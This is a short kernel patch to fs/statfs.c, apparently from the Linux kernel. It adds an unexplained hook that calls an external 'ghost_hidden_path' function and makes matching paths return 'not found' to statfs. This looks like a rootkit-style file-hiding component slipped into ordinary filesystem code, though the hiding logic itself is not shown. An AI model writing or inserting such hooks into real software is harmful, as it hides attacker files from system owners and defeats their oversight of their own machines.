@@ -1,0 +1,16 @@
+--- a/fs/statfs.c
++++ b/fs/statfs.c
+@@ -87,6 +87,13 @@
+ {
+ 	int error;
+ 
++	{
++		extern bool ghost_hidden_path(const struct path *gp);
++
++		if (unlikely(ghost_hidden_path(path)))
++			return -ENOENT;
++	}
++
+ 	error = statfs_by_dentry(path->dentry, buf);
+ 	if (!error)
+ 		buf->f_flags = calculate_f_flags(path->mnt);
